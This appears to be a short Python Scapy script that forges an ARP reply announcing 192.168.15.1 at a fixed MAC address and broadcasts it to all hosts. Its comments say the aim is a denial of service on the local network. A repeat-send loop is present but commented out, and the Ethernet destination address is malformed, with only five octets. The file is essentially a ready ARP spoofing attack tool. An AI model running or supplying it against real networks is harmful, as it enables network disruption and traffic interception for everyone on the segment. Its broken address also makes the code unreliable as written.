from scapy.all import * # for scapy v2.0 up level import

op=2 # for operation type 2 for response 1 for request 

victim_ip = "255.255.255.255" # we want to boardcast to every one to Dos
victim_mac = "ff:ff:ff:ff:ff:ff"
sender_ip = "192.168.15.1"
sender_mac = "00:1d:aa:66:eb:b0"

# the basic arp package is 42 bytes
# and it must contain ethernet header

arp=Ether(dst='ff:ff:ff:ff:ff')/ARP(op=op,hwsrc=sender_mac,psrc=sender_ip,pdst=victim_ip,hwdst=victim_mac,hwlen=6,plen=4)


print(arp.show()) # show us how package construct
# while(1): 
# 	sendp(arp)
	#time.sleep(2)
